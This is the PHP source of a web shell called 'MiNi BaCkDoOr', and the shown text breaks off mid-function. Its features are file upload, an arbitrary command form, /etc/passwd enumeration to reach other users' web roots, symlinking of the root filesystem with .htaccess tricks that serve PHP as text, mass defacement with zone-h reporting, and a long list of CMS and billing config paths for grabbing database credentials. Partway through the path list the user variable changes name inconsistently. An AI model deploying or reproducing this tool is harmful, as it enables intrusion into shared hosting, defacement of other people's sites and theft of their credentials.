<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<title>MiNi BaCkDoOr</title>
<style>
body{
background-color: #000d2a;
-webkit-background-size:cover;
-moz-background-size:cover;
-o-background-size:cover;
background-size:cover;
font-family:"kelly slab",cursive;
color:white;
background:#000d2a;
color:white;
border:5px solid #02BC8C;
border-radius:2px;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px black;
}
#content .first{
background-color: red;
}
table{
border: 1px #000000 dotted;
}
a{
color: white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
<br>
<center><img src="http://tools.niod-tech.com/hackedbynoniod7.png" width="250px" height="250px"></center>
<h2><center><font color="#00FFFF"><\> MINI BACKDOOR <\></font></center></h2>
<table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Berhasil!!</font><br />';
}else{
echo '<font color="red">Gagal!!</font><br/>';
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>BERSIH!!</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "Disable Functions : $show_ds<br>";
echo "System : <font color=lime>".$kernel."</font><br>";
echo "<center>";
echo "<hr>";
echo "[ <a href='?'>Home</a> ] - ";
echo "[ <a href='?path=$path&a=configv2'>Config</a> ] - ";
echo "[ <a href='?dir=$dir&to=zoneh'>Zone-h</a> ] - ";
echo "[ <a href='?path=$path&a=jumping'>Jumping</a> ] - ";
echo "[ <a href='?path=$path&a=symlink'>Symlink</a> ] - ";
echo "[ <a href='?dir=$dir&to=mass'>Mass Depes</a> ] - ";
echo "[ <a href='?path=$path&a=cmd'>Command</a> ]";
echo "</center>";
echo "<hr>";
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Noniod7'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['to'] == 'mass') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='icq.htm' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Noniod7</textarea><br>
	<input type='submit' name='start' value='HAJAR COK!' style='width: 450px;'>
	</form></center>";
	} 


##JUMPING 
} elseif($_GET['a'] == 'jumping') {
    $i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
    while($passwd = fgets($etc)) {
if($passwd == '' || !$etc) {
    echo "<font color=red>Can't read /etc/passwd</font>";
} else {
    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
    foreach($user_jumping[1] as $user_idx_jump) {
        $user_jumping_dir = "/home/$user_idx_jump/public_html";
        if(is_readable($user_jumping_dir)) {
            $i++;
            $jrw = "[<font color=#5ddcfc>R</font>] <a href='?dir=$user_jumping_dir'><font color=red>$user_jumping_dir</font></a>";
            if(is_writable($user_jumping_dir)) {
                $jrw = "[<font color=#5ddcfc>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#5ddcfc>$user_jumping_dir</font></a>";
            }
            echo $jrw;
            if(function_exists('posix_getpwuid')) {
                $domain_jump = file_get_contents("/etc/named.conf");   
                if($domain_jump == '') {
                    echo " => ( <font color=red>gagal mengambil nama domain nya</font> )<br>";
                } else {
                    preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                    foreach($domains_jump[1] as $dj) {
                        $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                        $user_jumping_url = $user_jumping_url['name'];
                        if($user_jumping_url == $user_idx_jump) {
                            echo " => ( <u>$dj</u> )<br>";
                            break;
                        }
                    }
                }
            } else {
                echo "<br>";
            }
        }
    }
}
    }
    if($i == 0) {
    } else {
echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
    
    echo "</div></pre>";
		}



} elseif($_GET['a'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}


}
elseif($_GET['a'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("niod_sym",0777);
@chdir("niod_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex niod.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/niod_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("niod_sym",0777);
@chdir("niod_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex niod.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/niod_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("niod_sym",0777);@chdir("niod_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex niod.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/niod_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }



} elseif($_GET['a'] == 'configv2') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("niod_symvhosts", 0777);
exe("ln -s / niod_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex niod.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("niod_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php niod_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php niod_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php niod_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php niod_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php niod_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php niod_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml niod_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php niod_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php niod_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("niod_symconfig", 0777);
@symlink("/","niod_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex niod.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("niod_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("niod_sym404", 0777);
@symlink("/","niod_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex niod.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*niod_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("niod_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("niod_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("niod_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_niod) {
$grab_config = array(
"/home/$user_niod/.accesshash" => "WHM-accesshash",
"/home/$user_niod/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_niod/public_html/forum/config.php" => "phpBB",
"/home/$user_niod/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_niod/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_niod/public_html/app/etc/local.xml" => "Magento",
"/home/$user_niod/public_html/admin/config.php" => "OpenCart",
"/home/$user_niod/public_html/application/config/database.php" => "Ellislab",
"/home/$user_niod/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/inc/config.php" => "MyBB",
"/home/$user_niod/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/inc/conf_global.php" => "IPB",
"/home/$user_niod/public_html/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/configuration.php" => "Joomla",
"/home/$user_niod/public_html/blog/configuration.php" => "Joomla",
"/home/$user_niod/public_html/submitticket.php" => "^WHMCS",
"/home/$user_niod/public_html/cms/configuration.php" => "Joomla",
"/home/$user_niod/public_html/beta/configuration.php" => "Joomla",
"/home/$user_niod/public_html/portal/configuration.php" => "Joomla",
"/home/$user_niod/public_html/site/configuration.php" => "Joomla",
"/home/$user_niod/public_html/main/configuration.php" => "Joomla",
"/home/$user_niod/public_html/home/configuration.php" => "Joomla",
"/home/$user_niod/public_html/demo/configuration.php" => "Joomla",
"/home/$user_niod/public_html/test/configuration.php" => "Joomla",
"/home/$user_niod/public_html/v1/configuration.php" => "Joomla",
"/home/$user_niod/public_html/v2/configuration.php" => "Joomla",
"/home/$user_niod/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_niod/public_html/new/configuration.php" => "Joomla",
"/home/$user_niod/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
